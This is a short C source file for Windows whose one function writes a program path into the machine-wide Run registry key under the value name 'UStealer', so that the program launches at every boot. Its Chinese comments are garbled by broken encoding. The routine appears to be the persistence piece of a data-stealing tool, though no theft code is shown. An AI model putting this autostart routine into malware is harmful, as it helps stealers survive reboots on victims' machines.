#include<stdio.h>
#include<windows.h>

void HKRunator(char *programName)   //�������ƣ�**ȫ·��**��
{
	HKEY hkey = NULL;
	DWORD rc;

	rc = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //����һ��ע�����������򿪸�ע�����
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //����windowsϵͳ������лᱨ�� ɾ�� ����KEY_WOW64_64KEY | ���� ����
		NULL,
		&hkey,
		NULL);

	if (rc == ERROR_SUCCESS)   
	{
		rc = RegSetValueEx(hkey, 
			"UStealer",
			0,
			REG_SZ,
			(const BYTE *)programName,
			strlen(programName));
		if (rc == ERROR_SUCCESS)
		{
			RegCloseKey(hkey);
		}
	}
}
